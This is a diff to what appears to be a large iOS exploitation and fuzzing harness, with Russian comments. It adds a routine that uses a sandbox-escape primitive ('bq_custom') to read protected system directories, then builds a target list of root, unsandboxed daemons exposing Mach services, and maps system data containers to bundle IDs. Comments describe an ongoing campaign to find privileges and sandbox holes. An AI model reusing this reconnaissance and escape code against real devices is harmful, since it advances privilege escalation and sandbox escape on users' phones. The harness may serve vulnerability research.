@@ -46052,6 +46052,236 @@ static void p_bq101(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq102 — v263: кампания «кто что читает», шаг 1: инвентарь демонов
+// ПО ПРИВИЛЕГИЯМ (§256-next). Фильтр юзера: цель — root + без профиля
+// + MachServices/entitlements, «бесполезный unsandboxed» не считается.
+// (1) dycache-дамп жив (7.15 ГБ бинарей демонов у нас)?
+// (2) LaunchDaemons/*.plist → таблица: Label | UserName | SandboxProfile |
+//     MachServices | Program. (3) Data/System контейнеры UUID→bundle-id.
+static void p_bq102(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq102] v263: инвентарь демонов по привилегиям (§256-next)");
+    fsync(fileno(stderr));
+
+    // === 1. dycache-дамп жив? ===
+    {
+        NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+        DIR *dd = opendir(docs.fileSystemRepresentation);
+        int n = 0; unsigned long long total = 0;
+        if (dd) {
+            struct dirent *de;
+            while ((de = readdir(dd))) {
+                if (strncmp(de->d_name, "dycache", 7) != 0) continue;
+                char p[1024];
+                snprintf(p, sizeof(p), "%s/%s", docs.fileSystemRepresentation, de->d_name);
+                struct stat st = {0};
+                if (stat(p, &st) != 0) continue;
+                if (S_ISDIR(st.st_mode)) {
+                    DIR *kd = opendir(p);
+                    struct dirent *ke; int c = 0; unsigned long long sz = 0;
+                    while (kd && (ke = readdir(kd))) {
+                        if (ke->d_name[0] == '.') continue;
+                        char kp[1280];
+                        snprintf(kp, sizeof(kp), "%s/%s", p, ke->d_name);
+                        struct stat ks = {0};
+                        if (stat(kp, &ks) == 0) { sz += ks.st_size; c++; }
+                    }
+                    if (kd) closedir(kd);
+                    total += sz; n++;
+                    LOG("[bq102] dycache: %s — %d сабфайлов, %llu MB", de->d_name, c, sz >> 20);
+                } else {
+                    total += st.st_size; n++;
+                    LOG("[bq102] dycache: %s — %llu MB", de->d_name, (unsigned long long)st.st_size >> 20);
+                }
+            }
+            closedir(dd);
+        }
+        LOG("[bq102] dycache ИТОГ: %d записей, %llu MB %s", n, total >> 20,
+            n ? "*** ДАМП ЖИВ — бинари демонов у нас ***"
+              : "(дампа нет — перезапустить bq44 или карвить из IPSW)");
+        fsync(fileno(stderr));
+    }
+
+    // === 2. LaunchDaemons/LaunchAgents: таблица по привилегиям ===
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    static const char *dirs[] = {
+        "/System/Library/LaunchDaemons",
+        "/System/Library/LaunchAgents",
+        "/private/preboot/Cryptexes/OS/System/Library/LaunchDaemons",
+    };
+    int n_root = 0, n_nosbx = 0, n_machsvc = 0, n_total = 0;
+    for (unsigned di = 0; di < sizeof(dirs) / sizeof(dirs[0]); di++) {
+        // v3: сначала ПРЯМОЙ opendir (песочница разрешает file-read /System
+        // для dlopen — plists могут читаться без escape), потом escape-варианты
+        DIR *direct = opendir(dirs[di]);
+        int64_t h = -1;
+        if (direct) {
+            LOG("[bq102] === %s (ПРЯМОЙ opendir OK — без escape)", dirs[di]);
+        } else {
+            h = bq_custom(dirs[di], 0, grp, 7, F_DEF, 3);
+            if (h < 0) h = bq_custom(dirs[di], 1, grp, 7, F_DEF, 3);
+            if (h < 0) h = bq_custom(dirs[di], 1, NULL, 13, F_DEF, 3);
+            LOG("[bq102] === %s (escape %lld, прямой opendir дал errno %d)",
+                dirs[di], (long long)h, errno);
+        }
+        if (!direct && h < 0) continue;
+        DIR *d = direct ? direct : opendir(dirs[di]);
+        if (!d) { if (h >= 0) bad_query_release(h); continue; }
+        struct dirent *e;
+        while ((e = readdir(d))) {
+            size_t nl = strlen(e->d_name);
+            if (nl < 6 || strcmp(e->d_name + nl - 6, ".plist") != 0) continue;
+            char fp[1024];
+            snprintf(fp, sizeof(fp), "%s/%s", dirs[di], e->d_name);
+            FILE *f = fopen(fp, "rb");
+            if (!f) continue;
+            fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+            if (sz <= 0 || sz > 128 * 1024) { fclose(f); continue; }
+            NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)sz];
+            if (fread(data.mutableBytes, 1, (size_t)sz, f) != (size_t)sz) { fclose(f); continue; }
+            fclose(f);
+            CFErrorRef err = NULL;
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                NULL, (__bridge CFDataRef)data, kCFPropertyListImmutable, NULL, &err);
+            if (err) { if (err) CFRelease(err); continue; }
+            if (!pl || CFGetTypeID(pl) != CFDictionaryGetTypeID()) {
+                if (pl) CFRelease(pl); continue;
+            }
+            CFDictionaryRef dict = (CFDictionaryRef)pl;
+            n_total++;
+            char label[128] = {0}, user[64] = {0}, prog[256] = {0}, sbx[64] = "-";
+            CFTypeRef v;
+            if ((v = CFDictionaryGetValue(dict, CFSTR("Label"))) &&
+                CFGetTypeID(v) == CFStringGetTypeID())
+                CFStringGetCString((CFStringRef)v, label, sizeof(label), kCFStringEncodingUTF8);
+            if ((v = CFDictionaryGetValue(dict, CFSTR("UserName"))) &&
+                CFGetTypeID(v) == CFStringGetTypeID())
+                CFStringGetCString((CFStringRef)v, user, sizeof(user), kCFStringEncodingUTF8);
+            else if ((v = CFDictionaryGetValue(dict, CFSTR("Umask"))))
+                snprintf(user, sizeof(user), "(default=root)");
+            if ((v = CFDictionaryGetValue(dict, CFSTR("SandboxProfile")))) {
+                if (CFGetTypeID(v) == CFStringGetTypeID())
+                    CFStringGetCString((CFStringRef)v, sbx, sizeof(sbx), kCFStringEncodingUTF8);
+                else if (CFGetTypeID(v) == CFArrayGetTypeID())
+                    snprintf(sbx, sizeof(sbx), "array(%ld)", (long)CFArrayGetCount((CFArrayRef)v));
+            } else snprintf(sbx, sizeof(sbx), "NONE");
+            if ((v = CFDictionaryGetValue(dict, CFSTR("ProgramArguments"))) &&
+                CFGetTypeID(v) == CFArrayGetTypeID() && CFArrayGetCount((CFArrayRef)v) > 0) {
+                CFTypeRef p0 = CFArrayGetValueAtIndex((CFArrayRef)v, 0);
+                if (CFGetTypeID(p0) == CFStringGetTypeID())
+                    CFStringGetCString((CFStringRef)p0, prog, sizeof(prog), kCFStringEncodingUTF8);
+            } else if ((v = CFDictionaryGetValue(dict, CFSTR("Program"))) &&
+                       CFGetTypeID(v) == CFStringGetTypeID())
+                CFStringGetCString((CFStringRef)v, prog, sizeof(prog), kCFStringEncodingUTF8);
+            int nsvc = 0;
+            char svc[160] = "";
+            if ((v = CFDictionaryGetValue(dict, CFSTR("MachServices"))) &&
+                CFGetTypeID(v) == CFDictionaryGetTypeID()) {
+                CFDictionaryRef ms = (CFDictionaryRef)v;
+                nsvc = (int)CFDictionaryGetCount(ms);
+                const void *keys0[8] = {NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL};
+                const void *vals0[8] = {NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL};
+                CFDictionaryGetKeysAndValues(ms, keys0, vals0);
+                for (int k = 0; k < 2 && k < nsvc; k++) {
+                    char kb[80] = {0};
+                    if (keys0[k] && CFGetTypeID(keys0[k]) == CFStringGetTypeID()) {
+                        CFStringGetCString((CFStringRef)keys0[k], kb, sizeof(kb), kCFStringEncodingUTF8);
+                        strncat(svc, kb, sizeof(svc) - strlen(svc) - 2);
+                        strncat(svc, ",", sizeof(svc) - strlen(svc) - 1);
+                    }
+                }
+            }
+            int is_root = (user[0] == 0 || strcmp(user, "root") == 0);
+            int is_nosbx = (strcmp(sbx, "NONE") == 0);
+            if (is_root) n_root++;
+            if (is_nosbx) n_nosbx++;
+            if (nsvc > 0) n_machsvc++;
+            // спам-фильтр: логируем только root или no-sandbox (остальные счётчиком)
+            if (is_root || is_nosbx)
+                LOG("[bq102]   %-52s uid=%-8s sbx=%-12s mach=%d %-22s %s",
+                    label, is_root ? "root" : (user[0] ? user : "?"), sbx, nsvc,
+                    nsvc ? svc : "", prog);
+            CFRelease(pl);
+        }
+        closedir(d);
+        if (h >= 0) bad_query_release(h);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq102] LaunchDirs ИТОГ: %d демонов, root=%d, no-sandbox=%d, с MachServices=%d",
+        n_total, n_root, n_nosbx, n_machsvc);
+    fsync(fileno(stderr));
+
+    // === 3. Data/System контейнеры: UUID → bundle-id (чьи данные читаем/пишем) ===
+    {
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        if (h < 0) h = bq_custom("/var/containers/Data/System", 1, grp, 7, F_DEF, 3);
+        LOG("[bq102] === /var/containers/Data/System (escape %lld)", (long long)h);
+        if (h < 0) return;
+        DIR *d = opendir("/var/containers/Data/System/");
+        if (!d) { bad_query_release(h); return; }
+        struct dirent *e;
+        int nc = 0, nmeta = 0, nlistonly = 0;
+        while ((e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            nc++;
+            char mp[1200];
+            snprintf(mp, sizeof(mp),
+                     "/var/containers/Data/System/%s/.com.apple.mobile_container_manager.metadata.plist",
+                     e->d_name);
+            FILE *f = fopen(mp, "rb");
+            if (!f) {
+                int meta_errno = errno;
+                // fallback: листинг каталога ВКЛЮЧАЯ dot-файлы (metadata скрыт!)
+                char dl[1024];
+                snprintf(dl, sizeof(dl), "/var/containers/Data/System/%s/", e->d_name);
+                DIR *dd = opendir(dl);
+                if (dd) {
+                    int cnt = 0;
+                    struct dirent *de2;
+                    char names[256] = "";
+                    while ((de2 = readdir(dd)) && cnt < 6) {
+                        if (!strcmp(de2->d_name, ".") || !strcmp(de2->d_name, "..")) continue;
+                        cnt++;
+                        strncat(names, de2->d_name, sizeof(names) - strlen(names) - 2);
+                        strncat(names, " ", sizeof(names) - strlen(names) - 1);
+                    }
+                    closedir(dd);
+                    LOG("[bq102]   container %s: meta-errno %d; %d записей: %s",
+                        e->d_name, meta_errno, cnt, names);
+                    nlistonly++;
+                }
+                continue;
+            }
+            fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+            if (sz <= 0 || sz > 32 * 1024) { fclose(f); continue; }
+            NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)sz];
+            if (fread(data.mutableBytes, 1, (size_t)sz, f) != (size_t)sz) { fclose(f); continue; }
+            fclose(f);
+            CFErrorRef err = NULL;
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                NULL, (__bridge CFDataRef)data, kCFPropertyListImmutable, NULL, &err);
+            if (err) { CFRelease(err); continue; }
+            if (pl && CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
+                CFTypeRef v = CFDictionaryGetValue((CFDictionaryRef)pl,
+                                                   CFSTR("MCMMetadataIdentifier"));
+                if (v && CFGetTypeID(v) == CFStringGetTypeID()) {
+                    char bid[192] = {0};
+                    CFStringGetCString((CFStringRef)v, bid, sizeof(bid), kCFStringEncodingUTF8);
+                    LOG("[bq102]   container %s → %s", e->d_name, bid);
+                    nmeta++;
+                }
+            }
+            if (pl) CFRelease(pl);
+        }
+        closedir(d);
+        bad_query_release(h);
+        LOG("[bq102] контейнеры ИТОГ: %d UUID, %d с bundle-id, %d только-листинг", nc, nmeta, nlistonly);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq102] ЗАВЕРШЕНО: таблица демонов по привилегиям собрана");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -54667,6 +54897,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ99")) { p_bq99(); LOG("[probe13] bq99-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ100")) { p_bq100(); LOG("[probe13] bq100-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ101")) { p_bq101(); LOG("[probe13] bq101-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ102")) { p_bq102(); LOG("[probe13] bq102-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
